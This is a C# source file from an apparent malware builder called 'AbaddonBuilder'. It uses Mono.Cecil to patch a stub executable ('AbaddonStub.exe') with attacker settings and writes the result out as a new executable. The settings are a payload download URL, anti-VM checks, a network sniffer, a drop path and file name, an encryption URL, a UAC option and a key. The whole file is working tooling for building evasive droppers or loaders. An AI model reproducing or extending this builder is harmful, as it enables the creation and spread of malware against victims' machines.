using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.IO;
using System.Linq;

namespace AbaddonBuilder.Compiler
{
    internal class Compile
    {
        internal static void CreateExe(string _Output, string PayloadUrl, string AntiVm, string WebSniffer, string DropPath, string EncryptUrl, string UAC, string DropName, string Key)
        {
            try
            {

                AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Path.GetTempPath() + "AbaddonStub.exe");
                foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition td) => td.FullName == "AbaddonStub.Options.有效載荷").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction.Operand = PayloadUrl;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.虛擬機").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = AntiVm;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.網絡嗅探").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = WebSniffer;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.小路").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = DropPath;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.加密").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = EncryptUrl;
                        break;
                    }
                }//
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.用戶訪問控制").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = UAC;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.丟棄名稱").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = DropName;
                        break;
                    }
                }
                foreach (Instruction instruction2 in assemblyDefinition.MainModule.Types.First((TypeDefinition td2) => td2.FullName == "AbaddonStub.Options.鑰匙").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
                {
                    bool instruct = instruction2.OpCode == OpCodes.Ldstr;
                    if (instruct)
                    {
                        instruction2.Operand = Key;
                        break;
                    }
                }
                assemblyDefinition.Name.Name = "Abaddon";
                assemblyDefinition.Name.Version = new Version(1, 0, 0, 0);
                assemblyDefinition.Write(_Output);

            }
            catch (Exception e)
            {
                e.ToString();
            }
        }
    }
}
